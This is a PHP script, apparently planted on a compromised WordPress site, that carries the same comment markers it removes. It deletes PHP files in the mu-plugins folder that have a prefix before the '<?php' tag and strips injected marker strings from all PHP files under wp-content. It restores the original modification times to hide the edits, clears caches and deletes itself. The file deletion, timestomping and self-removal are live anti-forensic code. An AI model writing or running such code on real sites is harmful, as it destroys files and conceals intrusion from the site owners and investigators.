<!--rQK6ds4J-->
<!--rQK6ds4J-->
<?php

$self = __FILE__;

function wpu_find_wp_root($start)
{
    $dir = $start;
    for ($i = 0; $i < 15; $i++) {
        if (!is_dir($dir . '/wp-content')) {
            $parent = dirname($dir);
            if ($parent === $dir) {
                break;
            }
            $dir = $parent;
            continue;
        }
        if (is_file($dir . '/wp-config.php') || is_file($dir . '/wp-load.php')) {
            return $dir;
        }
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }

    return null;
}

function wpu_has_prefix_before_php($content)
{
    $body = $content;
    if (strncmp($body, "\xEF\xBB\xBF", 3) === 0) {
        $body = substr($body, 3);
    }
    if (!preg_match('/<\?php\b/', $body, $m, PREG_OFFSET_CAPTURE)) {
        return false;
    }

    return (int) $m[0][1] > 0;
}

function wpu_invalidate_opcache($path)
{
    if (function_exists('opcache_invalidate')) {
        @opcache_invalidate($path, true);
    }
}

function wpu_iter_php_files($dir)
{
    if (!is_dir($dir)) {
        return;
    }
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
        );
    } catch (Exception $e) {
        return;
    }
    foreach ($it as $file) {
        if (!$file->isFile()) {
            continue;
        }
        $name = $file->getFilename();
        if (substr($name, -4) !== '.php' && substr($name, -5) !== '.phps') {
            continue;
        }
        yield $file->getPathname();
    }
}

function wpu_clean_upload_markers($content)
{
    $orig = $content;

    $head = preg_replace(
        '/^(?:\xEF\xBB\xBF)?(?:\s*<!--[a-zA-Z0-9]{8}-->\s*)*(?:[a-zA-Z0-9]{8})?(?=\s*<\?php)/',
        '',
        $content,
        1
    );
    if ($head !== null) {
        $content = $head;
    }

    $content = preg_replace('/^\s*<!--[a-zA-Z0-9]{8}-->\s*\r?\n/m', '', $content);
    $content = preg_replace('/[a-zA-Z0-9]{8}(?=\s*<\?php)/', '', $content);
    $content = preg_replace('/O R V X - SHOP(?=\s*<\?php)/', '', $content);

    return array($content, $content !== $orig);
}

function wpu_same_path($a, $b)
{
    $ra = @realpath($a);
    $rb = @realpath($b);

    return $ra && $rb && $ra === $rb;
}

$root = wpu_find_wp_root(__DIR__);
$selfReal = @realpath($self) ?: $self;

if ($root !== null) {
    $muDir = $root . '/wp-content/mu-plugins';
    foreach (wpu_iter_php_files($muDir) as $path) {
        if (wpu_same_path($path, $selfReal)) {
            continue;
        }
        $content = @file_get_contents($path);
        if ($content === false || !wpu_has_prefix_before_php($content)) {
            continue;
        }
        wpu_invalidate_opcache($path);
        @unlink($path);
    }

    $wpContent = $root . '/wp-content';
    foreach (wpu_iter_php_files($wpContent) as $path) {
        if (strpos($path, '/mu-plugins/') !== false || wpu_same_path($path, $selfReal)) {
            continue;
        }
        $content = @file_get_contents($path);
        if ($content === false) {
            continue;
        }
        list($newContent, $did) = wpu_clean_upload_markers($content);
        if (!$did || !is_writable($path)) {
            continue;
        }
        $ft = @filemtime($path);
        if (@file_put_contents($path, $newContent) !== false) {
            @touch($path, $ft ?: time());
            wpu_invalidate_opcache($path);
        }
    }

    $wpLoad = $root . '/wp-load.php';
    if (is_file($wpLoad)) {
        @require_once $wpLoad;
        if (function_exists('wp_cache_flush')) {
            @wp_cache_flush();
        }
    }
}

wpu_invalidate_opcache($selfReal);
@unlink($self);